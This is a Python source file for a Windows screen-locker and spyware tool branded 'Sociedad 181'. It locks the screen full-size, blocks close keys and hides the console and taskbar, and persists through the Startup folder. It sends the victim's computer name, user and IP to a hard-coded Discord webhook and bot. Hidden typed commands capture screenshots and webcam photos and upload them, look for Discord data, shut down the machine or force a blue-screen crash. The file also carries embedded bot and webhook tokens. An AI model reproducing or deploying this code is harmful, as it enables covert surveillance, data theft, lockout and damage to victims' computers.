import tkinter as tk
from tkinter import simpledialog, messagebox
import time
import os
from PIL import Image, ImageTk
import sys
import getpass
import ctypes
from ctypes import wintypes
import subprocess
import threading
import pyautogui
import cv2
import requests
import json
import discord
import asyncio
import psutil
import datetime

class HackTool:
    def __init__(self):
        # Ocultar la consola inmediatamente
        self.hide_console()
        
        self.root = tk.Tk()
        self.root.title("System Hackeado")
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')
        
        # Ocultar barra de tareas
        self.hide_taskbar()
        
        # Configurar bot de Discord
        self.discord_token = "MTQyNTIyNzI3Mjk0Nzc2NTI2OA.GMWx2r.cy_7T5FMc1Sm0QXce28RVjTDcKBH_16cK3GQ9I"
        self.guild_id = 1438969366996586536
        self.webhook_url = "https://discord.com/api/webhooks/1248531674833227867/5f0T1eHhL2w6qoWY9gK8nP2xQaBdR7vC3zMlN9jJ4kXpD5sV"
        
        # Variables para sesiones
        self.session_count = 1
        self.current_category = None
        
        # Bloquear todas las teclas y eventos de cierre
        self.root.protocol("WM_DELETE_WINDOW", self.disable_close)
        self.root.bind('<Escape>', self.disable_close)
        self.root.bind('<Alt-F4>', self.disable_close)
        self.root.bind('<Control-q>', self.disable_close)
        self.root.bind('<Control-w>', self.disable_close)
        self.root.bind('<F11>', self.disable_close)
        self.root.bind('<Alt-Tab>', self.disable_close)
        self.root.bind('<Control-Escape>', self.disable_close)
        self.root.bind('<Super_L>', self.disable_close)
        self.root.bind('<Super_R>', self.disable_close)
        self.root.bind('<Control-Alt-Delete>', self.disable_close)
        self.root.bind('<Control-Shift-Escape>', self.disable_close)
        
        # Bind para comandos secretos
        self.root.bind('<Key>', self.check_commands)
        self.command_buffer = ""
        
        # Bloquear todas las teclas function
        for i in range(1, 13):
            self.root.bind(f'<F{i}>', self.disable_close)
        
        # Bloquear el resto de teclas
        self.root.bind_all('<Key>', self.check_special_keys)
        
        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()
        
        # Tiempo inicial del contador
        self.hours = 250
        self.minutes = 30
        self.seconds = 10
        
        self.blink_state = True
        self.password = "061829"
        self.setup_ui()
        
        # Iniciar funciones de Discord en segundo plano
        threading.Thread(target=self.discord_setup, daemon=True).start()
        
    def discord_setup(self):
        """Configurar y ejecutar funciones de Discord"""
        try:
            # Enviar mensaje inicial via webhook
            self.send_initial_message()
            
            # Intentar crear canal con bot
            threading.Thread(target=self.try_create_channel, daemon=True).start()
            
        except Exception as e:
            print(f"Error en setup Discord: {e}")
    
    def send_initial_message(self):
        """Enviar mensaje inicial via webhook"""
        try:
            ip = self.get_ip_address()
            computer_name = os.getenv('COMPUTERNAME', 'Desconocido')
            user_name = getpass.getuser()
            
            message = {
                "content": f"🚨 **SISTEMA COMPROMETIDO - SOCIEDAD 181** 🚨",
                "embeds": [
                    {
                        "title": "💀 Sistema Infectado",
                        "description": f"**PC Name:** {computer_name}\n**User:** {user_name}\n**IP:** {ip}\n**Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                        "color": 16711680,
                        "fields": [
                            {"name": "Status", "value": "🟢 ACTIVO", "inline": True},
                            {"name": "Contador", "value": f"{self.hours:03d}:{self.minutes:02d}:{self.seconds:02d}", "inline": True},
                            {"name": "Sesión", "value": f"Sesión {self.session_count}", "inline": True}
                        ]
                    }
                ]
            }
            
            response = requests.post(self.webhook_url, json=message)
            if response.status_code == 204:
                print("Mensaje inicial enviado correctamente")
            else:
                print(f"Error enviando mensaje: {response.status_code}")
                
        except Exception as e:
            print(f"Error enviando mensaje inicial: {e}")
    
    def try_create_channel(self):
        """Intentar crear canal con el bot en categorías Sesion"""
        try:
            intents = discord.Intents.default()
            intents.guilds = True
            intents.messages = True
            
            client = discord.Client(intents=intents)
            
            @client.event
            async def on_ready():
                print(f'Bot listo: {client.user}')
                try:
                    guild = client.get_guild(self.guild_id)
                    if guild:
                        print(f"Servidor encontrado: {guild.name}")
                        
                        # Buscar o crear categoría "Sesion X"
                        category_name = f"Sesion {self.session_count}"
                        category = None
                        
                        # Buscar categoría existente
                        for cat in guild.categories:
                            if cat.name == category_name:
                                category = cat
                                break
                        
                        # Si no existe, crear categoría
                        if not category and guild.me.guild_permissions.manage_channels:
                            category = await guild.create_category(category_name)
                            print(f"Categoría creada: {category.name}")
                        
                        if category and guild.me.guild_permissions.manage_channels:
                            # Crear canal en la categoría
                            computer_name = os.getenv('COMPUTERNAME', 'Desconocido')
                            channel_name = f"hacked-{computer_name}-{int(time.time())}"
                            
                            channel = await guild.create_text_channel(
                                name=channel_name,
                                category=category,
                                reason="Canal creado por sistema comprometido"
                            )
                            
                            # Enviar mensaje en el nuevo canal
                            await channel.send(
                                f"🚨 **SISTEMA COMPROMETIDO - SESIÓN {self.session_count}** 🚨\n"
                                f"**PC:** {computer_name}\n"
                                f"**Usuario:** {getpass.getuser()}\n"
                                f"**IP:** {self.get_ip_address()}\n"
                                f"**Hora:** {datetime.datetime.now()}\n"
                                f"**Contador:** {self.hours:03d}:{self.minutes:02d}:{self.seconds:02d}\n\n"
                                f"💀 **Sociedad 181 - Sistema Activado** 💀\n"
                                f"*Este canal fue creado automáticamente en {category_name}*"
                            )
                            print(f"Canal creado: {channel.name} en {category_name}")
                            
                            # Incrementar contador de sesión para la próxima vez
                            self.session_count += 1
                        else:
                            print("No se pudo crear categoría o canal - permisos insuficientes")
                            self.send_to_discord_webhook("❌ Permisos insuficientes para crear categorías/canales")
                            
                    else:
                        print("Servidor no encontrado")
                        self.send_to_discord_webhook("❌ Servidor de Discord no encontrado")
                        
                except discord.Forbidden:
                    print("Permisos insuficientes")
                    self.send_to_discord_webhook("❌ Permisos insuficientes para crear canales")
                except Exception as e:
                    print(f"Error creando canal: {e}")
                    self.send_to_discord_webhook(f"❌ Error creando canal: {str(e)}")
                
                await client.close()
            
            # Ejecutar el cliente
            asyncio.run(client.start(self.discord_token))
            
        except Exception as e:
            print(f"Error en try_create_channel: {e}")
            self.send_to_discord_webhook(f"❌ Error general con bot: {str(e)}")
    
    def send_to_discord_webhook(self, message, filename=None):
        """Enviar mensaje o archivo via webhook"""
        try:
            if filename and os.path.exists(filename):
                with open(filename, 'rb') as f:
                    files = {'file': (filename, f, 'application/octet-stream')}
                    data = {'content': message}
                    response = requests.post(self.webhook_url, files=files, data=data)
            else:
                data = {'content': message}
                response = requests.post(self.webhook_url, json=data)
            
            if response.status_code in [200, 204]:
                print("Mensaje enviado via webhook")
                return True
            else:
                print(f"Error webhook: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"Error enviando webhook: {e}")
            return False

    def take_screenshot(self):
        """Tomar captura de pantalla"""
        try:
            screenshot = pyautogui.screenshot()
            filename = f"screenshot_{int(time.time())}.png"
            screenshot.save(filename)
            
            if self.send_to_discord_webhook("📸 Captura de pantalla tomada", filename):
                self.show_command_message("✅ Captura enviada a Discord")
            else:
                self.show_command_message("✅ Captura tomada (Error enviando)")
                
        except Exception as e:
            self.show_command_message(f"❌ Error en screenshot: {str(e)}")
    
    def take_webcam_photo(self):
        """Tomar foto con la webcam"""
        def webcam_thread():
            try:
                cap = cv2.VideoCapture(0)
                if cap.isOpened():
                    ret, frame = cap.read()
                    if ret:
                        filename = f"webcam_{int(time.time())}.jpg"
                        cv2.imwrite(filename, frame)
                        
                        if self.send_to_discord_webhook("📷 Foto de webcam tomada", filename):
                            self.show_command_message("✅ Foto de webcam enviada")
                        else:
                            self.show_command_message("✅ Foto tomada (Error enviando)")
                        cap.release()
                    else:
                        self.show_command_message("❌ No se pudo capturar imagen")
                else:
                    self.show_command_message("❌ No se pudo acceder a la webcam")
            except Exception as e:
                self.show_command_message(f"❌ Error en webcam: {str(e)}")
        
        threading.Thread(target=webcam_thread, daemon=True).start()

    def find_discord_tokens(self):
        """Buscar tokens de Discord"""
        def token_thread():
            try:
                tokens_found = []
                computer_name = os.getenv('COMPUTERNAME', 'Desconocido')
                
                discord_paths = [
                    os.getenv('APPDATA') + '\\Discord',
                    os.getenv('APPDATA') + '\\discordptb',
                    os.getenv('APPDATA') + '\\discordcanary',
                    os.getenv('LOCALAPPDATA') + '\\Discord',
                ]
                
                for path in discord_paths:
                    if os.path.exists(path):
                        tokens_found.append(f"📁 Carpeta encontrada: {path}")
                
                if tokens_found:
                    token_file = f"discord_info_{computer_name}_{int(time.time())}.txt"
                    with open(token_file, 'w', encoding='utf-8') as f:
                        f.write(f"INFORME DISCORD - {computer_name}\n")
                        f.write(f"Fecha: {datetime.datetime.now()}\n")
                        f.write("="*50 + "\n")
                        for info in tokens_found:
                            f.write(info + "\n")
                    
                    if self.send_to_discord_webhook(f"🔑 Información Discord - {computer_name}", token_file):
                        self.show_command_message("✅ Información Discord enviada")
                    else:
                        self.show_command_message("✅ Información recopilada (Error enviando)")
                else:
                    self.show_command_message("❌ No se encontraron datos de Discord")
                    
            except Exception as e:
                self.show_command_message(f"❌ Error buscando tokens: {str(e)}")
        
        threading.Thread(target=token_thread, daemon=True).start()

    def hide_console(self):
        """Ocultar la ventana de consola"""
        try:
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)
        except:
            pass
    
    def hide_taskbar(self):
        """Ocultar la barra de tareas"""
        try:
            taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            ctypes.windll.user32.ShowWindow(taskbar, 0)
            self.root.after(1000, self.keep_taskbar_hidden)
        except:
            pass
    
    def show_taskbar(self):
        """Mostrar la barra de tareas (al salir)"""
        try:
            taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            ctypes.windll.user32.ShowWindow(taskbar, 1)
        except:
            pass
    
    def keep_taskbar_hidden(self):
        """Mantener la barra de tareas oculta periódicamente"""
        try:
            taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            ctypes.windll.user32.ShowWindow(taskbar, 0)
            self.root.after(2000, self.keep_taskbar_hidden)
        except:
            pass
    
    def check_commands(self, event):
        """Detectar comandos secretos"""
        if event.char:
            self.command_buffer += event.char.lower()
            
            if len(self.command_buffer) > 20:
                self.command_buffer = self.command_buffer[-20:]
            
            if "!screenshot" in self.command_buffer:
                self.take_screenshot()
                self.command_buffer = ""
            elif "!foto" in self.command_buffer:
                self.take_webcam_photo()
                self.command_buffer = ""
            elif "!apagar" in self.command_buffer:
                self.shutdown_pc()
                self.command_buffer = ""
            elif "!reiniciar" in self.command_buffer:
                self.restart_pc()
                self.command_buffer = ""
            elif "!exit" in self.command_buffer:
                self.force_exit()
                self.command_buffer = ""
            elif "!token" in self.command_buffer:
                self.find_discord_tokens()
                self.command_buffer = ""
            elif "!horas" in self.command_buffer:
                self.add_hours()
                self.command_buffer = ""
            elif "!bsod" in self.command_buffer:
                self.force_bsod()
                self.command_buffer = ""
    
    def shutdown_pc(self):
        """Apagar la PC"""
        try:
            self.show_command_message("🔄 Apagando PC en 5 segundos...")
            time.sleep(5)
            os.system("shutdown /s /t 1")
        except Exception as e:
            self.show_command_message(f"❌ Error al apagar: {str(e)}")
    
    def restart_pc(self):
        """Reiniciar la PC"""
        try:
            self.show_command_message("🔄 Reiniciando PC en 5 segundos...")
            time.sleep(5)
            os.system("shutdown /r /t 1")
        except Exception as e:
            self.show_command_message(f"❌ Error al reiniciar: {str(e)}")
    
    def force_exit(self):
        """Forzar salida del programa"""
        self.show_taskbar()
        self.root.quit()
        self.root.destroy()
        os._exit(0)
    
    def add_hours(self):
        """Agregar horas al contador"""
        try:
            hours = simpledialog.askinteger("Agregar Horas", "¿Cuántas horas quieres agregar?")
            if hours and hours > 0:
                self.hours += hours
                self.show_command_message(f"✅ {hours} horas agregadas. Total: {self.hours:03d}:{self.minutes:02d}:{self.seconds:02d}")
        except:
            pass
    
    def force_bsod(self):
        """Forzar pantalla azul (BSOD) real"""
        try:
            self.show_command_message("💙 Forzando BSOD en 3 segundos...")
            time.sleep(3)
            
            # Método mejorado para BSOD
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
            # Forzar error crítico
            ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
                
        except Exception as e:
            try:
                # Método alternativo
                os.system("taskkill /f /im csrss.exe")
            except:
                self.show_command_message("❌ Error en BSOD")

    def get_ip_address(self):
        """Obtener dirección IP"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Desconocida"

    def show_command_message(self, message):
        """Mostrar mensaje de confirmación de comando"""
        def show_msg():
            msg_window = tk.Toplevel(self.root)
            msg_window.title("Comando Ejecutado")
            msg_window.geometry("400x80")
            msg_window.configure(bg='black')
            msg_window.attributes('-topmost', True)
            
            msg_window.update_idletasks()
            x = (self.root.winfo_screenwidth() - msg_window.winfo_width()) // 2
            y = (self.root.winfo_screenheight() - msg_window.winfo_height()) // 2
            msg_window.geometry(f"+{x}+{y}")
            
            label = tk.Label(
                msg_window,
                text=message,
                font=('Courier New', 10, 'bold'),
                fg='red',
                bg='black'
            )
            label.pack(expand=True, fill='both')
            
            msg_window.after(3000, msg_window.destroy)
        
        self.root.after(0, show_msg)

    def check_special_keys(self, event):
        """Bloquear combinaciones de teclas especiales"""
        if event.state == 12 and event.keysym in ('Delete', 'd', 'D'):
            return "break"
        elif event.state == 1 and event.keysym == 'Tab':
            return "break"
        elif event.keysym in ('Super_L', 'Super_R'):
            return "break"
        elif event.state == 4 and event.keysym in ('q', 'Q', 'w', 'W'):
            return "break"
        elif event.state == 5 and event.keysym in ('q', 'Q', 'w', 'W'):
            return "break"
        elif event.keysym in ('F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12'):
            return "break"
        return None  # Corregido: retornar None en lugar de no retornar nada

    def disable_close(self, event=None):
        """Impedir el cierre de la ventana"""
        self.show_password_dialog()
        return "break"

    def show_password_dialog(self):
        """Mostrar diálogo para ingresar contraseña"""
        password_window = tk.Toplevel(self.root)
        password_window.title("Autenticación Requerida")
        password_window.geometry("400x200")
        password_window.configure(bg='black')
        password_window.attributes('-topmost', True)
        
        password_window.protocol("WM_DELETE_WINDOW", lambda: None)
        password_window.bind('<Escape>', lambda e: None)
        
        main_frame = tk.Frame(password_window, bg='black', highlightthickness=2, highlightbackground='red')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        title_label = tk.Label(
            main_frame,
            text="▓▒░ AUTENTICACIÓN REQUERIDA ░▒▓",
            font=('Courier New', 14, 'bold'),
            fg='red',
            bg='black'
        )
        title_label.pack(pady=10)
        
        message_label = tk.Label(
            main_frame,
            text="Ingrese la contraseña para cerrar el sistema:",
            font=('Courier New', 10),
            fg='white',
            bg='black'
        )
        message_label.pack(pady=5)
        
        password_var = tk.StringVar()
        password_entry = tk.Entry(
            main_frame,
            textvariable=password_var,
            show='*',
            font=('Courier New', 12),
            width=20,
            justify='center'
        )
        password_entry.pack(pady=10)
        password_entry.focus()
        
        def verify_password():
            if password_var.get() == self.password:
                self.show_taskbar()
                password_window.destroy()
                self.root.quit()
                self.root.destroy()
                os._exit(0)
            else:
                error_label.config(text="▓ CONTRASEÑA INCORRECTA ▓", fg='red')
                password_var.set("")
                password_entry.focus()
        
        password_entry.bind('<Return>', lambda e: verify_password())
        
        verify_btn = tk.Button(
            main_frame,
            text="▓ VERIFICAR ▓",
            command=verify_password,
            font=('Courier New', 10, 'bold'),
            fg='black',
            bg='red',
            relief='raised',
            bd=3
        )
        verify_btn.pack(pady=5)
        
        error_label = tk.Label(
            main_frame,
            text="",
            font=('Courier New', 10, 'bold'),
            fg='black',
            bg='black'
        )
        error_label.pack(pady=5)
        
        password_window.transient(self.root)
        password_window.grab_set()

    def setup_ui(self):
        main_frame = tk.Frame(self.root, bg='black', highlightthickness=2, highlightbackground='red')
        main_frame.pack(expand=True, fill='both', padx=50, pady=50)
        
        self.title_label = tk.Label(
            main_frame,
            text="▓▒░ SISTEMA HACKEADO ░▒▓",
            font=('Courier New', 24, 'bold'),
            fg='red',
            bg='black'
        )
        self.title_label.pack(pady=20)
        
        self.load_image(main_frame)
        self.setup_counter(main_frame)
        
        separator = tk.Label(
            main_frame,
            text="▬" * 80,
            font=('Courier New', 12),
            fg='red',
            bg='black'
        )
        separator.pack(pady=20)
        
        message_frame = tk.Frame(main_frame, bg='black', highlightthickness=1, highlightbackground='red')
        message_frame.pack(pady=10, padx=20, fill='both', expand=True)
        
        main_message = tk.Label(
            message_frame,
            text="VAI SE FUDER, SEU ANOMAL DE MERDA!\nSEU PC FOI HACKEADO PELA SOCIEDADE 181.\nSE VOCÊ QUISER IR EMBORA, NUNCA MAIS VAI SAIR DAQUI.",
            font=('Courier New', 16, 'bold'),
            fg='red',
            bg='black',
            justify='center'
        )
        main_message.pack(pady=20)
        
        self.final_label = tk.Label(
            main_frame,
            text="▓▒░ Seu computador foi invadido pela Sociedade 181. ░▒▓",
            font=('Courier New', 16, 'bold'),
            fg='red',
            bg='black'
        )
        self.final_label.pack(pady=20)
        
        password_btn = tk.Button(
            main_frame,
            text="▓▒░ INGRESAR CONTRASEÑA PARA SALIR ░▒▓",
            command=self.show_password_dialog,
            font=('Courier New', 12, 'bold'),
            fg='black',
            bg='red',
            relief='raised',
            bd=5,
            cursor='pirate'
        )
        password_btn.pack(pady=15)
        
        commands_label = tk.Label(
            main_frame,
            text="[ COMANDOS: LAMMER]",
            font=('Courier New', 8),
            fg='white',
            bg='black'
        )
        commands_label.pack(pady=5)
        
        exit_label = tk.Label(
            main_frame,
            text="[ PRESIONE CUALQUIER TECLA E INGRESE LA CONTRASEÑA 061829 PARA SALIR ]",
            font=('Courier New', 10),
            fg='white',
            bg='black'
        )
        exit_label.pack(pady=10)
        
        self.start_animations()

    def load_image(self, parent):
        try:
            if os.path.exists("calavera.png"):
                img = Image.open("calavera.png")
                img.thumbnail((400, 300), Image.Resampling.LANCZOS)
                self.photo = ImageTk.PhotoImage(img)
                img_frame = tk.Frame(parent, bg='black', highlightthickness=1, highlightbackground='red')
                img_frame.pack(pady=15)
                img_label = tk.Label(img_frame, image=self.photo, bg='black')
                img_label.pack(padx=5, pady=5)
            else:
                self.create_image_not_found(parent)
        except Exception as e:
            self.create_image_not_found(parent)
    
    def create_image_not_found(self, parent):
        img_frame = tk.Frame(parent, bg='black', highlightthickness=1, highlightbackground='red')
        img_frame.pack(pady=15)
        error_label = tk.Label(
            img_frame,
            text="CAVALEVRA.PNG NOT FOUND",
            font=('Courier New', 16, 'bold'),
            fg='red',
            bg='black'
        )
        error_label.pack(padx=10, pady=10)
    
    def setup_counter(self, parent):
        counter_frame = tk.Frame(parent, bg='black', highlightthickness=1, highlightbackground='red')
        counter_frame.pack(pady=15)
        counter_title = tk.Label(
            counter_frame,
            text="TEMPO RESTANTE:",
            font=('Courier New', 14, 'bold'),
            fg='red',
            bg='black'
        )
        counter_title.pack(pady=(10, 5))
        self.counter_label = tk.Label(
            counter_frame,
            text=f"{self.hours:03d}:{self.minutes:02d}:{self.seconds:02d}",
            font=('Courier New', 32, 'bold'),
            fg='red',
            bg='black'
        )
        self.counter_label.pack(pady=10)
        self.update_counter()
    
    def update_counter(self):
        if self.seconds > 0:
            self.seconds -= 1
        else:
            if self.minutes > 0:
                self.minutes -= 1
                self.seconds = 59
            else:
                if self.hours > 0:
                    self.hours -= 1
                    self.minutes = 59
                    self.seconds = 59
        self.counter_label.config(text=f"{self.hours:03d}:{self.minutes:02d}:{self.seconds:02d}")
        self.root.after(1000, self.update_counter)
    
    def start_animations(self):
        self.animate_title()
        self.animate_final_message()
    
    def animate_title(self):
        if self.blink_state:
            self.title_label.config(fg='red')
        else:
            self.title_label.config(fg='#400000')
        self.blink_state = not self.blink_state
        self.root.after(600, self.animate_title)
    
    def animate_final_message(self):
        def blink():
            current_color = self.final_label.cget('fg')
            new_color = 'red' if current_color == '#400000' else '#400000'
            self.final_label.config(fg=new_color)
            self.root.after(500, blink)
        blink()
    
    def run(self):
        try:
            self.root.mainloop()
        except Exception as e:
            self.root.mainloop()

def add_to_startup():
    try:
        user_name = getpass.getuser()
        startup_path = f"C:\\Users\\{user_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        bat_path = os.path.join(startup_path, "system_tool.bat")
        script_path = os.path.abspath(__file__)
        with open(bat_path, 'w') as bat_file:
            bat_file.write(f'@echo off\n')
            bat_file.write(f'pythonw "{script_path}"\n')
            bat_file.write('exit\n')
        print(f"Script agregado al inicio: {bat_path}")
    except Exception as e:
        print(f"Error al agregar al inicio: {e}")

if __name__ == "__main__":
    if not hasattr(sys, 'startup_added'):
        add_to_startup()
        sys.startup_added = True
    app = HackTool()
    app.run()